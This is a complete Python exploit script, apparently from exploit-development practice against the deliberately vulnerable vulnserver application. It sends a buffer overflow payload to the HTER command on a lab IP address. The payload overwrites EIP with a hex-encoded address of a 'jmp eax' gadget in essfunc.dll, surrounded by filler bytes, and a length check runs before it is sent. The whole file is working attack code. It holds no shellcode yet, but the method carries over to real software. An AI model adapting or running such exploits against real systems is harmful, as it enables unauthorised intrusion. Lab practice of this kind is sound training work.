#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)


def validate_len(payload):
    exploit_len = 5000
    payload_len = len(payload)
    if payload_len != exploit_len:
        print('[!] Payload was length {pl}, expected {el}'.format(
            pl=payload_len, el=exploit_len))
        exit(1)


if __name__ == '__main__':
    print('[*] building payload and running validations')
    payload = "HTER 0"
    # overwrote EIP with CDABCDAB - note the capitalization, whcih we didn't send
    payload += "A" * 2040
    # Message=  0x625011b1 : jmp eax |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
    payload += "b1115062"
    payload += "C" * 2944
    payload += "\r\n"
    validate_len(payload)
    print('[*] validations passed')
    print('[*] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[*] connected. waiting for welcome message')
    welcome = s.recv(1024)
    print('[*] received message:\n\t{msg}'.format(msg=welcome))
    print('[*] sending payload')
    s.send(payload)
    print('[*] B00M!')
    s.close()
